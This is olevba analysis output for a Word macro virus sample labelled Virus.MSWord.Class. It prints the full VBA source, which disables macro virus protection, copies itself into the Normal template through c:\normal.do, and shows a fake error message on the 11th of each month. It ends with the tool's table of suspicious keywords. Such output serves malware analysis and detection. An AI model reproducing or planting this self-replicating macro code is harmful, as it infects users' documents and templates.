olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.eb-16d0b424135a7769e76b996f943affb98afd502c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.eb-16d0b424135a7769e76b996f943affb98afd502c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  On Error GoTo out
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Options.ConfirmConversions = False
  ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
  nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
  If nt > 30 And ad > 0 Then GoTo out
  If nt < 30 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\normal.do"
  End If
  If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
  If Day(Now) = 11 Then
    MsgBox "Internal Error!  Restart Word.", 0, "Microsoft Word"
   End If
  host.codemodule.AddFromFile ("c:\normal.do")
  With host.codemodule
    For x = 1 To 4
      .deletelines 1
    Next x
  End With
  If nt < 30 Then
    With host.codemodule
    .replaceline 1, "Sub AutoClose()"
    End With
  End If

out:
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
